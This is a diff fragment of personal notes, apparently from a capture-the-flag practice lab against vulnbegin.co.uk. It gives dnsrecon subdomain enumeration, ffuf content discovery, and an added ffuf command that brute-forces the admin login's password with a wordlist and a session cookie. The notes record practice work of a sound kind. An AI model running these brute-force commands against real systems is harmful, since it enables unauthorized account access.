@@ -38,3 +38,11 @@ dnsrecon -d vulnbegin.co.uk -D ~/wordlists/subdomains.txt -t brt
 
 content discovery using ffuf:
 ffuf -p 0.1 -t 1 -w ~/wordlists/content.txt -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -u http://www.vulnbegin.co.uk/FUZZ
+
+
+in this case username was admin but the response code is 200 for both valid and invalid requests:
+to filter out 200 requets i used command:
+
+
+ffuf -p 0.1 -t 1 -w ~/wordlists/passwords.txt -X POST -d "username=admin&password=FUZZ" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSTRNWGd5WVdwMGRTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkMGE3MTE1NmMxYTY5YmM3NWRjN2QzZDg1ZjEwNzVkYiJ9" -H "Content-Type: application/x-www-form-urlencoded" -u http://www.vulnbegin.co.uk/cpadmin/login -mc all -fc 200
+
